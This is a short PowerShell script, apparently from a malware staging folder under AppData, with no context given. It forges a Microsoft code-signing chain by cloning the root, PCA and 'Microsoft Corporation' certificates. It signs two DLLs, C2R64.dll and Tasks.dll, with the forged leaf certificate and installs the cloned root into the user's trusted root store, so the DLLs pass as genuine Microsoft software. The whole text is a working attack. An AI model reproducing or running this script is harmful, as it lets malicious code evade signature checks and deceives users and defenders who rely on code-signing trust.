Set-Location C:\Users\Admin\AppData\Roaming\CLView
$CertStoreLocation = @{ CertStoreLocation = 'Cert:\CurrentUser\My' }

$MS_Root_Cert = Get-PfxCertificate -FilePath "Microsoft Root Certificate.cer"
$Cloned_MS_Root_Cert = New-SelfSignedCertificate -CloneCert $MS_Root_Cert @CertStoreLocation

$MS_PCA_Cert = Get-PfxCertificate -FilePath "Microsoft Code Signing PCA.cer"
$Cloned_MS_PCA_Cert = New-SelfSignedCertificate -CloneCert $MS_PCA_Cert -Signer $Cloned_MS_Root_Cert @CertStoreLocation

$MS_Leaf_Cert = Get-PfxCertificate -FilePath "Microsoft Corporation.cer"
$Cloned_MS_Leaf_Cert = New-SelfSignedCertificate -CloneCert $MS_Leaf_Cert -Signer $Cloned_MS_PCA_Cert @CertStoreLocation

Set-AuthenticodeSignature -Certificate $Cloned_MS_Leaf_Cert -FilePath C2R64.dll
Set-AuthenticodeSignature -Certificate $Cloned_MS_Leaf_Cert -FilePath Tasks.dll
Export-Certificate -Type CERT -FilePath Root.cer -Cert $Cloned_MS_Root_Cert
Import-Certificate -FilePath Root.cer -CertStoreLocation Cert:\CurrentUser\Root\